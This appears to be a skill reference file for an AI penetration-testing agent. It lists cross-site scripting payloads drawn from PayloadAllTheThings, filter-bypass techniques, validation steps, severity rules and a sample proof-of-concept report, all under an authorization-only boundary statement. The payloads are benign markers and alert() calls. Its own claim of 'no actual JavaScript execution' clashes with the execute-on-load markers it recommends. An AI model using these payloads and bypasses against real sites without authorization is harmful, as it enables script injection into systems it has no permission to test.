# XSS Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify XSS vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, use harmless markers for validation
> - XSS payloads are for understanding attack surface only, **no user data theft**
> - Validation proves vulnerability existence (observe payload in response), **no actual JavaScript execution**
> - `alert()` execution requires authorization; use `console.log()` or harmless markers by default
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings

---

## Validation Objectives (Within Security Boundary)

XSS vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Reflected XSS | ✓ Send payload, observe response echo | - | Actually trigger alert |
| Stored XSS | ✓ Submit payload, verify storage | - | Wait for victim trigger |
| DOM XSS | ✓ Analyze JS code for sink | - | Execute malicious JS |
| Alert Execution | ❌ Not by default | ✓ Requires explicit authorization | Cookie theft/keylogging |

**Safe Validation Method**: Use harmless marker like `<img src=x onerror=console.log('XSS')>` or `<div data-xss="test">` instead of `alert()`.

---

## Safe Validation Payloads (Recommended Default)

```html
<!-- Harmless markers - use these for default validation -->
<img src=x onerror=console.log('XSS')>
<img src=x onerror=document.write('XSS')>
<div data-test="XSS_MARKER">test</div>
<svg onload=console.log('XSS')>
<script>console.log('XSS')</script>
```

---

## Alert-based Payloads (Requires Authorization)

Following payloads trigger visible JavaScript execution; use only with user authorization:

```html
<!-- ⚠️ Requires authorization - triggers actual JS execution -->
<script>alert(document.domain)</script>
<script>alert(1)</script>
<ScRiPt>alert(document.domain)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<SVG ONLOAD=alert(1)>
```

---

## Stored XSS

```html
<!-- Safe validation -->
<script>console.log('stored-XSS')</script>

<!-- ⚠️ Requires authorization -->
<script>alert(localStorage.getItem('xss'))</script>
```

## DOM-based XSS
```html
<div data-x="${input}"></div>
<script>
  var x = document.getElementById('xss').getAttribute('data-x');
  eval(x);
</script>
```

## Common Filters
| Character | Filter Rule | Bypass Method |
|------|----------|--------|
| `<script>` | Delete | `<ScRiPt>`, `<IMG>`, `<SVG>` |
| `alert` | Delete | `prompt`, `confirm` |
| Space | Delete | `%20`, `\t` |
| `onerror` | Delete | `ONERROR` |
| Single quote | URL encode | `%27` |
| Double quote | URL encode | `%22` |

## Validation Steps

1. Input basic payload in parameter
2. Observe if response returns unchanged
3. Gradually modify to bypass
4. Maximum 8 probes
5. If exists, provide PoC

## Example Output
```markdown
## XSS Vulnerability

- **Location**: https://target.com/search?q=
- **Parameter**: q
- **Type**: Reflected XSS
- **Context**: HTML body
- **Filter**: <script> deleted
- **Bypass**: <IMG SRC=x ONERROR=alert(1)>

**PoC**:
https://target.com/search?q=<IMG SRC=x ONERROR=alert(document.domain)>
```

## Severity Classification

XSS severity is based on **whether JS execution is confirmed** — not on payload being accepted. Payload reflection into response != XSS — must confirm script can actually execute (alert/onerror triggered) for High.

| XSS type | Default | Upgrade condition |
|---------|------|---------|
| Stored XSS | Medium | -> High: Execution confirmed (alert succeeds) + widespread impact (multiple users affected)|
| Reflected XSS | Medium | -> High: Execution confirmed (alert succeeds) + on sensitive page/parameter |
| DOM XSS | Medium | -> High: Confirmed JS execution chain reachable (see dom-xss.md)|
| Payload reflected into response but execution not confirmed (blocked by CSP/encoding/sandbox)| Low | Pending execution confirmation |
| Payload accepted but output correctly encoded, no execution | Info | Defense effective |
| Reflection in HTTP response header/non-HTML context only | Low | Cannot execute |

**Key judgment**: Reporting High requires confirming "script actually executed" — proof only of payload reflection into HTML does not equal XSS; must verify execution (alert/onerror/console). Unverified execution is Medium or below.

**Boundary coordination**: This file prohibits `alert()` execution by default (L118). Therefore within default scope XSS records Medium at most. "Execution confirmed = High" requires user authorization for harmless popup verification (such as `alert(document.domain)`) before recording. Do not raise severity based on possible execution without authorization.

---

## Prohibited

- ⚠️ No alert() execution
- ⚠️ No actual popup triggering
- ⚠️ Only provide PoC proof